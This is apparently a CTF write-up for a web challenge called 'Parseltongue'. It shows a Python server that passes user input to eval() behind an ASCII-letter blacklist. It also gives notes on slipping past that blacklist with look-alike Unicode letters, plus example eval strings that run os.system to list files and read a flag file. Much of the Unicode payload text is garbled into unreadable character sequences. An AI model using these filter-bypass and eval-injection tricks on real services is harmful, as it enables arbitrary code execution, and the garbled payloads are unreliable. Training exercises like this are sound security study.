# Web: Parseltongue

You've meddled with the timeline, and now nobody speaks your language! Biff offers to help, but neither of you can understand each other. Can you sort this out?

**Target**: 68.183.43.15:30543

---

## Server with comments
To execute the server locally, copy this code to a python file.

```python
#!/usr/bin/env python3
import string


def ctf_challenge():
    blacklist = string.ascii_letters + '"\''  # --> abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"'

    payload = input("π²π½πΆπ πππππΉ πππ ππΎππ ππ ππ πΉπ? ")
    # Iterate though all the characters of the payload
    # If a payload character is in the blacklist, filter() will remove it
    # DEBUG ---------------------------
    print(f'[Before filter] payload={payload}')
    filtrado = filter(lambda c: c in blacklist, payload)
    print(f'[After filter] payload={payload} & filtered={", ".join(filtrado)}')
    # If filter is not empty (it contains blacklisted characters or quotes), then any() returs true and the program breaks
    print(f'any = {any(filter(lambda c: c in blacklist, payload))}')
    # ----------------------------

    if any(filter(lambda c: c in blacklist, payload)):
        # If a blacklisted character is found, filer() returns true thus any() also returns true
        print("πΌ πΉππ'π πππΉπππππΆππΉ ππ½πΆπ πππ πππΆπ")
    else:
        # If the payload does not contain blacklisted characters, the payload is evaluated
        eval(payload)

```

I think we need to reach the else clause. For that we need to avoid any of these characters in the payload: `abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"'`

But how to write any intruction without using ascii characters? The key is to use unicode characters, since those can be interpreted by the computer and readed by humans, but are not considered equal to the ascii representation. For example, `π != a`

We tried to open the flag file and read its lines, but we were always blocked at the same point: the quotes. How could we input that command without using quotes?

## Extrange language

```
Payload: π²π½πΆπ πππππΉ πππ ππΎππ ππ ππ πΉπ? 
---
exit -> π?ππ²π½(1)
print(open('./flag.txt', 'r').readlines())
πππππ(ππππ(β./ππππ.πππβ,βπβ).πππππππππ())
---
π
π
π
π
π
π
π
π
π
π
π
π
π
π
π
π
π
π
π
π
π
π
π
π
π
π
β
```

## Eval()

[docs](https://realpython.com/python-eval-function/)

3 arguments
- expression  (string or compiled bytecode)
- globals
- locals

For example, I could evaluate:
- `eval("os.system('ls -la')")`
- `eval("os.system('cat /home/me/flag')")`
- `eval(compile("os.system('cat /home/me/flag')", "<string>", "eval"))`
